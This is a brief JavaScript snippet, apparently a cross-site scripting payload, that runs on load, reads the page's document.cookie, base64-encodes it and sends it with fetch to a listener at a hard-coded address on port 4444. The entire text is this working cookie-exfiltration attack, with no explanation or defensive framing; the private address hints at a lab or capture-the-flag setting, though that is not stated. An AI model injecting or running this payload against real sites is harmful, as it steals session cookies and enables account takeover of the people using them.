const lhost = '10.4.1.239';
const port = '4444';
const sendCookie = () => {
    fetch(`http://${lhost}:${port}?key=` + btoa(document.cookie));
}

sendCookie();
